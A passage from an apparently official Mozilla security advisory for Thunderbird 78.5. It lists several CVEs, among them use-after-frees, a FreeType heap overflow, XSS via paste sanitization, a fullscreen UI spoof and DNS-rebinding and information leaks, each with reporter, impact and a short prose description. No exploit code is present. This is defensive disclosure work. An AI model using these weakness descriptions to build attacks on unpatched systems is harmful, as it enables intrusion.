When drawing a transparent image on top of an unknown cross-origin image, the Skia library `drawImage` function took a variable amount of time depending on the content of the underlying image. This resulted in potential cross-origin information exposure of image content through timing side-channel attacks.

#### [#CVE-2020-26953: Fullscreen could be enabled without displaying the security UI](#CVE-2020-26953)

Reporter
Abdulrahman Alqabandi of Microsoft Browser Vulnerability Research
Impact
moderate
##### Description

It was possible to cause the browser to enter fullscreen mode without displaying the security UI; thus making it possible to attempt a phishing attack or otherwise confuse the user.

* [Bug 1656741](https://bugzilla.mozilla.org/show_bug.cgi?id=1656741)

#### [#CVE-2020-26956: XSS through paste (manual and clipboard API)](#CVE-2020-26956)

Reporter
Irvan Kurniawan (@sourc7)
Impact
moderate
##### Description

In some cases, removing HTML elements during sanitization would keep existing SVG event handlers and therefore lead to XSS.

#### [#CVE-2020-26958: Requests intercepted through ServiceWorkers lacked MIME type restrictions](#CVE-2020-26958)

Reporter
Moti Harmats
Impact
moderate
##### Description

Thunderbird did not block execution of scripts with incorrect MIME types when the response was intercepted and cached through a ServiceWorker. This could lead to a cross-site script inclusion vulnerability, or a Content Security Policy bypass.

* [Bug 1669355](https://bugzilla.mozilla.org/show_bug.cgi?id=1669355)

#### [#CVE-2020-26959: Use-after-free in WebRequestService](#CVE-2020-26959)

Reporter
Bharadwaj Machiraju
Impact
moderate
##### Description

During browser shutdown, reference decrementing could have occured on a previously freed object, resulting in a use-after-free, memory corruption, and a potentially exploitable crash.

##### References

* [Bug 1669466](https://bugzilla.mozilla.org/show_bug.cgi?id=1669466)

#### [#CVE-2020-26960: Potential use-after-free in uses of nsTArray](#CVE-2020-26960)

Reporter
Zijie Zhao
Impact
moderate
##### Description

If the `Compact()` method was called on an nsTArray, the array could have been reallocated without updating other pointers, leading to a potential use-after-free and exploitable crash.

* [Bug 1670358](https://bugzilla.mozilla.org/show_bug.cgi?id=1670358)

#### [#CVE-2020-15999: Heap buffer overflow in freetype](#CVE-2020-15999)

Reporter
Sergei Glazunov of Google Project Zero
Impact
moderate
##### Description

In Freetype, if PNG images were embedded into fonts, the `Load_SBit_Png` function contained an integer overflow that led to a heap buffer overflow, memory corruption, and an exploitable crash.
*Note: While Project Zero did discover instances of this vulnerability being exploited in the wild against Chrome, in Thunderbird this vulnerability is only triggerable if a rarely-used, hidden preference is toggled, and only affected Linux and Android operating systems. Other operating systems are unaffected; and Linux and Android are unaffected in the default configuration.*

#### [#CVE-2020-26961: DoH did not filter IPv4 mapped IP Addresses](#CVE-2020-26961)

Reporter
Gabriel Corona
Impact
moderate
##### Description

When DNS over HTTPS is in use, it intentionally filters RFC1918 and related IP ranges from the responses as these do not make sense coming from a DoH resolver. However when an IPv4 address was mapped through IPv6, these addresses were erroneously let through, leading to a potential DNS Rebinding attack.

* [Bug 1672528](https://bugzilla.mozilla.org/show_bug.cgi?id=1672528)

#### [#CVE-2020-26965: Software keyboards may have remembered typed passwords](#CVE-2020-26965)

Reporter
Makoto Kato
Impact
low
##### Description

Some websites have a feature "Show Password" where clicking a button will change a password field into a textbook field, revealing the typed password. If, when using a software keyboard that remembers user input, a user typed their password and used that feature, the type of the password field was changed, resulting in a keyboard layout change and the possibility for the software keyboard to remember the typed password.

* [Bug 1661617](https://bugzilla.mozilla.org/show_bug.cgi?id=1661617)

#### [#CVE-2020-26966: Single-word search queries were also broadcast to local network](#CVE-2020-26966)

Reporter
tiebuchen
Impact
low
##### Description

Searching for a single word from the address bar caused an mDNS request to be sent on the local network searching for a hostname consisting of that string; resulting in an information leak.
*Note: This issue only affected Windows operating systems. Other operating systems are unaffected.*

#### [#CVE-2020-26968: Memory safety bugs fixed in Thunderbird 78.5](#CVE-2020-26968)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers Steve Fink, Jason Kratzer, Randell Jesup, Christian Holler, and Byron Campen reported memory safety bugs present in Thunderbird 78.4. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.
